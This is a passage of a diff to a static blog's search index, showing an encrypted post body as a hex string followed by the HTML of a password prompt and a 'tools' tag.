9d491ed813f632b390d8c1969cb4b31d49357e21663ad4a8a5862347e7e75a7c0425a4cffbdf6492b0ef52ef244febb746fec9e57495464c48e22e01e71869ab481685768f0b290db77f0ec72e447c23e1965aa9e1249e06bcfb7016541397cd6633625a43b50fcb0b6466d38eead013e17c5fc04c296708509f2c53a9754601aff8a124c66848c3a7e999cba9caa0c38612d4203b362a6c8d5786978c10fc838f735cd6fe4694826dc6dacd47dc4d861b68d8fd4b3f62e91472f8ddecad780a3b82b1db29d87a6fd281cc57c20873e65c9e97a95a90ce2c102c65974845fc078209d432b6230b4b320d43e372f1b1f4472bd98d7a983c5a92debf30716dd1b5a669236420c59dc7bdbc6cdaf9cdbd8d2778c4e5da3de9cdc717313679a2efb9219a09b3b7f3624ce4b9f98d4c52118894b343b110fb8f48c9060dd1929e75a6f002fd9f5047b1dbc7067ba3d923c56584f443db772d420663a2ef388f5eec1a8519e3c26a847632d14cf12a9a050b21c4251c14b6c6b5cd05c22e1001b1f330b272bae5192d3e9a81e1f1989d86a2861eb43b73192122bc87998dbbb21bd9f0ae9fec19f1f7497baaa8077a0a51b88dbfa24fd4693e0c8e5417eed8eee7b00a058bcdc594e7580c6450603b001a1982bd447339326f367933ca241eb4cecec7b818b9ce6eaedeb3e45063afe52a9c1bacab655ef3539764d06c160673326ce95de3c6dee48dc3531f3296e8234902b002a806d3fcfe6789b2e3cb7afd0f20cc039ca253ada69739411a3050bdb36e13136fe7445f1615e8ebce80a49ee5b025dcaf8e23c277b03ce73135c8d51bc7d2d447de5b1679ae949d132e279bd80d98963aeeceba8748319fe1f38bdcdda54f83640935c3e1e3e6a41b0d94f5b8e3101b7f5423b98aba4ceb087463b6ffa21c04a6db17e23457a35442db0fbab1b6de96d81b9aaf06d318ef22aff3487db8b6c17631c15f8f23c0d01e90d824bd6d4af16f3f13eca075a327b21dae940fc6b4cc3a</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <tags>
+        <tag>tools</tag>
       </tags>
   </entry>
 </search>
